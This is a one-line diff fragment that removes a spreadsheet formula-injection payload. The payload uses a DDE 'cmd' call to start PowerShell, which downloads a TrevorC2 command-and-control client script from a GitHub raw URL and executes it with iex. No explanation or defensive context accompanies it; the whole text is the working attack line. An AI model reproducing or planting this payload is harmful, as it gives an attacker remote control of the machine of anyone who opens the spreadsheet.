@@ -1,1 +1,0 @@
-=cmd|' /Cpowershell iex ((New-Object System.Net.WebClient).DownloadString("""https://raw.githubusercontent.com/sharkush/test1/master/trevorc2_client.ps1"""));'!'A69'
